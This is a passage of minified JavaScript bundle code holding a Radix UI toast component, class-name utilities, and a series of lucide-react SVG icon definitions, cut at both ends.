                                          onPointerDown: Se(e.onPointerDown, (O) => {
                                              O.button === 0 && (y.current = { x: O.clientX, y: O.clientY });
                                          }),
                                          onPointerMove: Se(e.onPointerMove, (O) => {
                                              if (!y.current) return;
                                              const $ = O.clientX - y.current.x,
                                                  B = O.clientY - y.current.y,
                                                  I = !!b.current,
                                                  N = ["left", "right"].includes(v.swipeDirection),
                                                  T = ["left", "up"].includes(v.swipeDirection) ? Math.min : Math.max,
                                                  L = N ? T(0, $) : 0,
                                                  V = N ? 0 : T(0, B),
                                                  U = O.pointerType === "touch" ? 10 : 2,
                                                  q = { x: L, y: V },
                                                  X = { originalEvent: O, delta: q };
                                              I
                                                  ? ((b.current = q), Js(_v, p, X, { discrete: !1 }))
                                                  : mp(q, v.swipeDirection, U)
                                                    ? ((b.current = q),
                                                      Js(Mv, d, X, { discrete: !1 }),
                                                      O.target.setPointerCapture(O.pointerId))
                                                    : (Math.abs($) > U || Math.abs(B) > U) && (y.current = null);
                                          }),
                                          onPointerUp: Se(e.onPointerUp, (O) => {
                                              const $ = b.current,
                                                  B = O.target;
                                              if (
                                                  (B.hasPointerCapture(O.pointerId) &&
                                                      B.releasePointerCapture(O.pointerId),
                                                  (b.current = null),
                                                  (y.current = null),
                                                  $)
                                              ) {
                                                  const I = O.currentTarget,
                                                      N = { originalEvent: O, delta: $ };
                                                  mp($, v.swipeDirection, v.swipeThreshold)
                                                      ? Js(Ov, f, N, { discrete: !0 })
                                                      : Js(Lv, m, N, { discrete: !0 }),
                                                      I.addEventListener("click", (T) => T.preventDefault(), {
                                                          once: !0,
                                                      });
                                              }
                                          }),
                                      }),
                                  }),
                              }),
                              v.viewport
                          ),
                      }),
                  ],
              })
            : null;
    }),
    Fv = (e) => {
        const { __scopeToast: t, children: n, ...r } = e,
            o = wa(js, t),
            [s, i] = x.useState(!1),
            [a, l] = x.useState(!1);
        return (
            Hv(() => i(!0)),
            x.useEffect(() => {
                const u = window.setTimeout(() => l(!0), 1e3);
                return () => window.clearTimeout(u);
            }, []),
            a
                ? null
                : c.jsx(_h, {
                      asChild: !0,
                      children: c.jsx(xa, { ...r, children: s && c.jsxs(c.Fragment, { children: [o.label, " ", n] }) }),
                  })
        );
    },
    Uv = "ToastTitle",
    Uh = x.forwardRef((e, t) => {
        const { __scopeToast: n, ...r } = e;
        return c.jsx(Ke.div, { ...r, ref: t });
    });
Uh.displayName = Uv;
var $v = "ToastDescription",
    $h = x.forwardRef((e, t) => {
        const { __scopeToast: n, ...r } = e;
        return c.jsx(Ke.div, { ...r, ref: t });
    });
$h.displayName = $v;
var Hh = "ToastAction",
    Bh = x.forwardRef((e, t) => {
        const { altText: n, ...r } = e;
        return n.trim()
            ? c.jsx(Wh, { altText: n, asChild: !0, children: c.jsx(Ru, { ...r, ref: t }) })
            : (console.error(`Invalid prop \`altText\` supplied to \`${Hh}\`. Expected non-empty \`string\`.`), null);
    });
Bh.displayName = Hh;
var Vh = "ToastClose",
    Ru = x.forwardRef((e, t) => {
        const { __scopeToast: n, ...r } = e,
            o = Dv(Vh, n);
        return c.jsx(Wh, {
            asChild: !0,
            children: c.jsx(Ke.button, { type: "button", ...r, ref: t, onClick: Se(e.onClick, o.onClose) }),
        });
    });
Ru.displayName = Vh;
var Wh = x.forwardRef((e, t) => {
    const { __scopeToast: n, altText: r, ...o } = e;
    return c.jsx(Ke.div, {
        "data-radix-toast-announce-exclude": "",
        "data-radix-toast-announce-alt": r || void 0,
        ...o,
        ref: t,
    });
});
function Kh(e) {
    const t = [];
    return (
        Array.from(e.childNodes).forEach((r) => {
            if ((r.nodeType === r.TEXT_NODE && r.textContent && t.push(r.textContent), Bv(r))) {
                const o = r.ariaHidden || r.hidden || r.style.display === "none",
                    s = r.dataset.radixToastAnnounceExclude === "";
                if (!o)
                    if (s) {
                        const i = r.dataset.radixToastAnnounceAlt;
                        i && t.push(i);
                    } else t.push(...Kh(r));
            }
        }),
        t
    );
}
function Js(e, t, n, { discrete: r }) {
    const o = n.originalEvent.currentTarget,
        s = new CustomEvent(e, { bubbles: !0, cancelable: !0, detail: n });
    t && o.addEventListener(e, t, { once: !0 }), r ? jh(o, s) : o.dispatchEvent(s);
}
var mp = (e, t, n = 0) => {
    const r = Math.abs(e.x),
        o = Math.abs(e.y),
        s = r > o;
    return t === "left" || t === "right" ? s && r > n : !s && o > n;
};
function Hv(e = () => {}) {
    const t = Fn(e);
    Un(() => {
        let n = 0,
            r = 0;
        return (
            (n = window.requestAnimationFrame(() => (r = window.requestAnimationFrame(t)))),
            () => {
                window.cancelAnimationFrame(n), window.cancelAnimationFrame(r);
            }
        );
    }, [t]);
}
function Bv(e) {
    return e.nodeType === e.ELEMENT_NODE;
}
function Vv(e) {
    const t = [],
        n = document.createTreeWalker(e, NodeFilter.SHOW_ELEMENT, {
            acceptNode: (r) => {
                const o = r.tagName === "INPUT" && r.type === "hidden";
                return r.disabled || r.hidden || o
                    ? NodeFilter.FILTER_SKIP
                    : r.tabIndex >= 0
                      ? NodeFilter.FILTER_ACCEPT
                      : NodeFilter.FILTER_SKIP;
            },
        });
    for (; n.nextNode(); ) t.push(n.currentNode);
    return t;
}
function al(e) {
    const t = document.activeElement;
    return e.some((n) => (n === t ? !0 : (n.focus(), document.activeElement !== t)));
}
var Wv = Oh,
    Qh = Dh,
    Gh = Fh,
    qh = Uh,
    Xh = $h,
    Yh = Bh,
    Zh = Ru;
function Jh(e) {
    var t,
        n,
        r = "";
    if (typeof e == "string" || typeof e == "number") r += e;
    else if (typeof e == "object")
        if (Array.isArray(e)) {
            var o = e.length;
            for (t = 0; t < o; t++) e[t] && (n = Jh(e[t])) && (r && (r += " "), (r += n));
        } else for (n in e) e[n] && (r && (r += " "), (r += n));
    return r;
}
function eg() {
    for (var e, t, n = 0, r = "", o = arguments.length; n < o; n++)
        (e = arguments[n]) && (t = Jh(e)) && (r && (r += " "), (r += t));
    return r;
}
const hp = (e) => (typeof e == "boolean" ? `${e}` : e === 0 ? "0" : e),
    gp = eg,
    Kv = (e, t) => (n) => {
        var r;
        if ((t == null ? void 0 : t.variants) == null)
            return gp(e, n == null ? void 0 : n.class, n == null ? void 0 : n.className);
        const { variants: o, defaultVariants: s } = t,
            i = Object.keys(o).map((u) => {
                const d = n == null ? void 0 : n[u],
                    p = s == null ? void 0 : s[u];
                if (d === null) return null;
                const m = hp(d) || hp(p);
                return o[u][m];
            }),
            a =
                n &&
                Object.entries(n).reduce((u, d) => {
                    let [p, m] = d;
                    return m === void 0 || (u[p] = m), u;
                }, {}),
            l =
                t == null || (r = t.compoundVariants) === null || r === void 0
                    ? void 0
                    : r.reduce((u, d) => {
                          let { class: p, className: m, ...f } = d;
                          return Object.entries(f).every((S) => {
                              let [v, w] = S;
                              return Array.isArray(w) ? w.includes({ ...s, ...a }[v]) : { ...s, ...a }[v] === w;
                          })
                              ? [...u, p, m]
                              : u;
                      }, []);
        return gp(e, i, l, n == null ? void 0 : n.class, n == null ? void 0 : n.className);
    };
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const Qv = (e) => e.replace(/([a-z0-9])([A-Z])/g, "$1-$2").toLowerCase(),
    tg = (...e) =>
        e
            .filter((t, n, r) => !!t && t.trim() !== "" && r.indexOf(t) === n)
            .join(" ")
            .trim();
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ var Gv = {
    xmlns: "http://www.w3.org/2000/svg",
    width: 24,
    height: 24,
    viewBox: "0 0 24 24",
    fill: "none",
    stroke: "currentColor",
    strokeWidth: 2,
    strokeLinecap: "round",
    strokeLinejoin: "round",
};
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const qv = x.forwardRef(
    (
        {
            color: e = "currentColor",
            size: t = 24,
            strokeWidth: n = 2,
            absoluteStrokeWidth: r,
            className: o = "",
            children: s,
            iconNode: i,
            ...a
        },
        l
    ) =>
        x.createElement(
            "svg",
            {
                ref: l,
                ...Gv,
                width: t,
                height: t,
                stroke: e,
                strokeWidth: r ? (Number(n) * 24) / Number(t) : n,
                className: tg("lucide", o),
                ...a,
            },
            [...i.map(([u, d]) => x.createElement(u, d)), ...(Array.isArray(s) ? s : [s])]
        )
);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const F = (e, t) => {
    const n = x.forwardRef(({ className: r, ...o }, s) =>
        x.createElement(qv, { ref: s, iconNode: t, className: tg(`lucide-${Qv(e)}`, r), ...o })
    );
    return (n.displayName = `${e}`), n;
};
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const ei = F("Archive", [
    ["rect", { width: "20", height: "5", x: "2", y: "3", rx: "1", key: "1wp1u1" }],
    ["path", { d: "M4 8v11a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8", key: "1s80jp" }],
    ["path", { d: "M10 12h4", key: "a56b0p" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const yp = F("ArrowRight", [
    ["path", { d: "M5 12h14", key: "1ays0h" }],
    ["path", { d: "m12 5 7 7-7 7", key: "xquz4c" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const gc = F("BookOpen", [
    ["path", { d: "M12 7v14", key: "1akyts" }],
    [
        "path",
        {
            d: "M3 18a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1h5a4 4 0 0 1 4 4 4 4 0 0 1 4-4h5a1 1 0 0 1 1 1v13a1 1 0 0 1-1 1h-6a3 3 0 0 0-3 3 3 3 0 0 0-3-3z",
            key: "ruj8y",
        },
    ],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const ll = F("Bot", [
    ["path", { d: "M12 8V4H8", key: "hb8ula" }],
    ["rect", { width: "16", height: "12", x: "4", y: "8", rx: "2", key: "enze0r" }],
    ["path", { d: "M2 14h2", key: "vft8re" }],
    ["path", { d: "M20 14h2", key: "4cs60a" }],
    ["path", { d: "M15 13v2", key: "1xurst" }],
    ["path", { d: "M9 13v2", key: "rq6x2g" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const Xv = F("Box", [
    [
        "path",
        {
            d: "M21 8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16Z",
            key: "hh9hay",
        },
    ],
    ["path", { d: "m3.3 7 8.7 5 8.7-5", key: "g66t2b" }],
    ["path", { d: "M12 22V12", key: "d0xqtd" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const ng = F("Brain", [
    [
        "path",
        { d: "M12 5a3 3 0 1 0-5.997.125 4 4 0 0 0-2.526 5.77 4 4 0 0 0 .556 6.588A4 4 0 1 0 12 18Z", key: "l5xja" },
    ],
    [
        "path",
        { d: "M12 5a3 3 0 1 1 5.997.125 4 4 0 0 1 2.526 5.77 4 4 0 0 1-.556 6.588A4 4 0 1 1 12 18Z", key: "ep3f8r" },
    ],
    ["path", { d: "M15 13a4.5 4.5 0 0 1-3-4 4.5 4.5 0 0 1-3 4", key: "1p4c4q" }],
    ["path", { d: "M17.599 6.5a3 3 0 0 0 .399-1.375", key: "tmeiqw" }],
    ["path", { d: "M6.003 5.125A3 3 0 0 0 6.401 6.5", key: "105sqy" }],
    ["path", { d: "M3.477 10.896a4 4 0 0 1 .585-.396", key: "ql3yin" }],
    ["path", { d: "M19.938 10.5a4 4 0 0 1 .585.396", key: "1qfode" }],
    ["path", { d: "M6 18a4 4 0 0 1-1.967-.516", key: "2e4loj" }],
    ["path", { d: "M19.967 17.484A4 4 0 0 1 18 18", key: "159ez6" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const rg = F("Bug", [
    ["path", { d: "m8 2 1.88 1.88", key: "fmnt4t" }],
    ["path", { d: "M14.12 3.88 16 2", key: "qol33r" }],
    ["path", { d: "M9 7.13v-1a3.003 3.003 0 1 1 6 0v1", key: "d7y7pr" }],
    ["path", { d: "M12 20c-3.3 0-6-2.7-6-6v-3a4 4 0 0 1 4-4h4a4 4 0 0 1 4 4v3c0 3.3-2.7 6-6 6", key: "xs1cw7" }],
    ["path", { d: "M12 20v-9", key: "1qisl0" }],
    ["path", { d: "M6.53 9C4.6 8.8 3 7.1 3 5", key: "32zzws" }],
    ["path", { d: "M6 13H2", key: "82j7cp" }],
    ["path", { d: "M3 21c0-2.1 1.7-3.9 3.8-4", key: "4p0ekp" }],
    ["path", { d: "M20.97 5c0 2.1-1.6 3.8-3.5 4", key: "18gb23" }],
    ["path", { d: "M22 13h-4", key: "1jl80f" }],
    ["path", { d: "M17.2 17c2.1.1 3.8 1.9 3.8 4", key: "k3fwyw" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const Au = F("Check", [["path", { d: "M20 6 9 17l-5-5", key: "1gmf2c" }]]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const Wi = F("ChevronDown", [["path", { d: "m6 9 6 6 6-6", key: "qrunsl" }]]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const Ki = F("ChevronUp", [["path", { d: "m18 15-6-6-6 6", key: "153udz" }]]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const Yv = F("CircleCheckBig", [
    ["path", { d: "M21.801 10A10 10 0 1 1 17 3.335", key: "yps3ct" }],
    ["path", { d: "m9 11 3 3L22 4", key: "1pflzl" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const cl = F("Clock", [
    ["circle", { cx: "12", cy: "12", r: "10", key: "1mglay" }],
    ["polyline", { points: "12 6 12 12 16 14", key: "68esgv" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const Mu = F("Code", [
    ["polyline", { points: "16 18 22 12 16 6", key: "z7tu5w" }],
    ["polyline", { points: "8 6 2 12 8 18", key: "1eg1df" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const Zv = F("Command", [
    ["path", { d: "M15 6v12a3 3 0 1 0 3-3H6a3 3 0 1 0 3 3V6a3 3 0 1 0-3 3h12a3 3 0 1 0-3-3", key: "11bfej" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const Sa = F("Copy", [
    ["rect", { width: "14", height: "14", x: "8", y: "8", rx: "2", ry: "2", key: "17jyea" }],
    ["path", { d: "M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2", key: "zix9uf" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const vp = F("Cpu", [
    ["rect", { width: "16", height: "16", x: "4", y: "4", rx: "2", key: "14l7u7" }],
    ["rect", { width: "6", height: "6", x: "9", y: "9", rx: "1", key: "5aljv4" }],
    ["path", { d: "M15 2v2", key: "13l42r" }],
    ["path", { d: "M15 20v2", key: "15mkzm" }],
    ["path", { d: "M2 15h2", key: "1gxd5l" }],
    ["path", { d: "M2 9h2", key: "1bbxkp" }],
    ["path", { d: "M20 15h2", key: "19e6y8" }],
    ["path", { d: "M20 9h2", key: "19tzq7" }],
    ["path", { d: "M9 2v2", key: "165o2o" }],
    ["path", { d: "M9 20v2", key: "i2bqo8" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const og = F("Database", [
    ["ellipse", { cx: "12", cy: "5", rx: "9", ry: "3", key: "msslwz" }],
    ["path", { d: "M3 5V19A9 3 0 0 0 21 19V5", key: "1wlel7" }],
    ["path", { d: "M3 12A9 3 0 0 0 21 12", key: "mv7ke4" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const Qi = F("Download", [
    ["path", { d: "M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4", key: "ih7n3h" }],
    ["polyline", { points: "7 10 12 15 17 10", key: "2ggqvy" }],
    ["line", { x1: "12", x2: "12", y1: "15", y2: "3", key: "1vk2je" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const Jv = F("Earth", [
    ["path", { d: "M21.54 15H17a2 2 0 0 0-2 2v4.54", key: "1djwo0" }],
    [
        "path",
        { d: "M7 3.34V5a3 3 0 0 0 3 3a2 2 0 0 1 2 2c0 1.1.9 2 2 2a2 2 0 0 0 2-2c0-1.1.9-2 2-2h3.17", key: "1tzkfa" },
    ],
    ["path", { d: "M11 21.95V18a2 2 0 0 0-2-2a2 2 0 0 1-2-2v-1a2 2 0 0 0-2-2H2.05", key: "14pb5j" }],
    ["circle", { cx: "12", cy: "12", r: "10", key: "1mglay" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const ul = F("ExternalLink", [
    ["path", { d: "M15 3h6v6", key: "1q9fwt" }],
    ["path", { d: "M10 14 21 3", key: "gplh6r" }],
    ["path", { d: "M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6", key: "a6xqqp" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const Gi = F("Eye", [
    [
        "path",
        {
            d: "M2.062 12.348a1 1 0 0 1 0-.696 10.75 10.75 0 0 1 19.876 0 1 1 0 0 1 0 .696 10.75 10.75 0 0 1-19.876 0",
            key: "1nclc0",
        },
    ],
    ["circle", { cx: "12", cy: "12", r: "3", key: "1v7zrd" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const Tr = F("FileText", [
    ["path", { d: "M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7Z", key: "1rqfz7" }],
    ["path", { d: "M14 2v4a2 2 0 0 0 2 2h4", key: "tnqrlb" }],
    ["path", { d: "M10 9H8", key: "b1mrlr" }],
    ["path", { d: "M16 13H8", key: "t4e002" }],
    ["path", { d: "M16 17H8", key: "z1uh3a" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const ex = F("Fingerprint", [
    ["path", { d: "M12 10a2 2 0 0 0-2 2c0 1.02-.1 2.51-.26 4", key: "1nerag" }],
    ["path", { d: "M14 13.12c0 2.38 0 6.38-1 8.88", key: "o46ks0" }],
    ["path", { d: "M17.29 21.02c.12-.6.43-2.3.5-3.02", key: "ptglia" }],
    ["path", { d: "M2 12a10 10 0 0 1 18-6", key: "ydlgp0" }],
    ["path", { d: "M2 16h.01", key: "1gqxmh" }],
    ["path", { d: "M21.8 16c.2-2 .131-5.354 0-6", key: "drycrb" }],
    ["path", { d: "M5 19.5C5.5 18 6 15 6 12a6 6 0 0 1 .34-2", key: "1tidbn" }],
    ["path", { d: "M8.65 22c.21-.66.45-1.32.57-2", key: "13wd9y" }],
    ["path", { d: "M9 6.8a6 6 0 0 1 9 5.2v2", key: "1fr1j5" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const dl = F("FolderOpen", [
    [
        "path",
        {
            d: "m6 14 1.5-2.9A2 2 0 0 1 9.24 10H20a2 2 0 0 1 1.94 2.5l-1.54 6a2 2 0 0 1-1.95 1.5H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h3.9a2 2 0 0 1 1.69.9l.81 1.2a2 2 0 0 0 1.67.9H18a2 2 0 0 1 2 2v2",
            key: "usdka0",
        },
    ],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const Rs = F("Globe", [
    ["circle", { cx: "12", cy: "12", r: "10", key: "1mglay" }],
    ["path", { d: "M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20", key: "13o1zl" }],
    ["path", { d: "M2 12h20", key: "9i4pu4" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const sg = F("HardDrive", [
    ["line", { x1: "22", x2: "2", y1: "12", y2: "12", key: "1y58io" }],
    [
        "path",
        {
            d: "M5.45 5.11 2 12v6a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2v-6l-3.45-6.89A2 2 0 0 0 16.76 4H7.24a2 2 0 0 0-1.79 1.11z",
            key: "oot6mr",
        },
    ],
    ["line", { x1: "6", x2: "6.01", y1: "16", y2: "16", key: "sgf278" }],
    ["line", { x1: "10", x2: "10.01", y1: "16", y2: "16", key: "1l4acy" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const tx = F("Hash", [
    ["line", { x1: "4", x2: "20", y1: "9", y2: "9", key: "4lhtct" }],
    ["line", { x1: "4", x2: "20", y1: "15", y2: "15", key: "vyu0kd" }],
    ["line", { x1: "10", x2: "8", y1: "3", y2: "21", key: "1ggp8o" }],
    ["line", { x1: "16", x2: "14", y1: "3", y2: "21", key: "weycgp" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const nx = F("House", [
    ["path", { d: "M15 21v-8a1 1 0 0 0-1-1h-4a1 1 0 0 0-1 1v8", key: "5wwlr5" }],
    [
        "path",
        {
            d: "M3 10a2 2 0 0 1 .709-1.528l7-5.999a2 2 0 0 1 2.582 0l7 5.999A2 2 0 0 1 21 10v9a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z",
            key: "1d0kgt",
        },
    ],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const rx = F("Image", [
    ["rect", { width: "18", height: "18", x: "3", y: "3", rx: "2", ry: "2", key: "1m3agn" }],
    ["circle", { cx: "9", cy: "9", r: "2", key: "af1f0g" }],
    ["path", { d: "m21 15-3.086-3.086a2 2 0 0 0-2.828 0L6 21", key: "1xmnt7" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const xp = F("Instagram", [
    ["rect", { width: "20", height: "20", x: "2", y: "2", rx: "5", ry: "5", key: "2e1cvw" }],
    ["path", { d: "M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z", key: "9exkf1" }],
    ["line", { x1: "17.5", x2: "17.51", y1: "6.5", y2: "6.5", key: "r4j83e" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const yc = F("Key", [
    ["path", { d: "m15.5 7.5 2.3 2.3a1 1 0 0 0 1.4 0l2.1-2.1a1 1 0 0 0 0-1.4L19 4", key: "g0fldk" }],
    ["path", { d: "m21 2-9.6 9.6", key: "1j0ho8" }],
    ["circle", { cx: "7.5", cy: "15.5", r: "5.5", key: "yqb3hr" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const ox = F("Laptop", [
    [
        "path",
        {
            d: "M20 16V7a2 2 0 0 0-2-2H6a2 2 0 0 0-2 2v9m16 0H4m16 0 1.28 2.55a1 1 0 0 1-.9 1.45H3.62a1 1 0 0 1-.9-1.45L4 16",
            key: "tarvll",
        },
    ],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const sx = F("Layers", [
    [
        "path",
        {
            d: "m12.83 2.18a2 2 0 0 0-1.66 0L2.6 6.08a1 1 0 0 0 0 1.83l8.58 3.91a2 2 0 0 0 1.66 0l8.58-3.9a1 1 0 0 0 0-1.83Z",
            key: "8b97xw",
        },
    ],
    ["path", { d: "m22 17.65-9.17 4.16a2 2 0 0 1-1.66 0L2 17.65", key: "dd6zsq" }],
    ["path", { d: "m22 12.65-9.17 4.16a2 2 0 0 1-1.66 0L2 12.65", key: "ep9fru" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const wp = F("List", [
    ["path", { d: "M3 12h.01", key: "nlz23k" }],
    ["path", { d: "M3 18h.01", key: "1tta3j" }],
    ["path", { d: "M3 6h.01", key: "1rqtza" }],
    ["path", { d: "M8 12h13", key: "1za7za" }],
    ["path", { d: "M8 18h13", key: "1lx6n3" }],
    ["path", { d: "M8 6h13", key: "ik3vkj" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const vc = F("Lock", [
    ["rect", { width: "18", height: "11", x: "3", y: "11", rx: "2", ry: "2", key: "1w4ew1" }],
    ["path", { d: "M7 11V7a5 5 0 0 1 10 0v4", key: "fwvmzm" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const ix = F("Menu", [
    ["line", { x1: "4", x2: "20", y1: "12", y2: "12", key: "1e0a9i" }],
    ["line", { x1: "4", x2: "20", y1: "6", y2: "6", key: "1owob3" }],
    ["line", { x1: "4", x2: "20", y1: "18", y2: "18", key: "yk5zj1" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const Yo = F("Monitor", [
    ["rect", { width: "20", height: "14", x: "2", y: "3", rx: "2", key: "48i651" }],
    ["line", { x1: "8", x2: "16", y1: "21", y2: "21", key: "1svkeh" }],
    ["line", { x1: "12", x2: "12", y1: "17", y2: "21", key: "vw1qmm" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const ax = F("Moon", [["path", { d: "M12 3a6 6 0 0 0 9 9 9 9 0 1 1-9-9Z", key: "a7tn18" }]]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const $r = F("Network", [
    ["rect", { x: "16", y: "16", width: "6", height: "6", rx: "1", key: "4q2zg0" }],
    ["rect", { x: "2", y: "16", width: "6", height: "6", rx: "1", key: "8cvhb9" }],
    ["rect", { x: "9", y: "2", width: "6", height: "6", rx: "1", key: "1egb70" }],
    ["path", { d: "M5 16v-3a1 1 0 0 1 1-1h12a1 1 0 0 1 1 1v3", key: "1jsf9p" }],
    ["path", { d: "M12 12V8", key: "2874zd" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const ti = F("Power", [
    ["path", { d: "M12 2v10", key: "mnfbl" }],
    ["path", { d: "M18.4 6.6a9 9 0 1 1-12.77.04", key: "obofu9" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const lx = F("Radio", [
    ["path", { d: "M4.9 19.1C1 15.2 1 8.8 4.9 4.9", key: "1vaf9d" }],
    ["path", { d: "M7.8 16.2c-2.3-2.3-2.3-6.1 0-8.5", key: "u1ii0m" }],
    ["circle", { cx: "12", cy: "12", r: "2", key: "1c9p78" }],
    ["path", { d: "M16.2 7.8c2.3 2.3 2.3 6.1 0 8.5", key: "1j5fej" }],
    ["path", { d: "M19.1 4.9C23 8.8 23 15.1 19.1 19", key: "10b0cb" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const Sp = F("RefreshCw", [
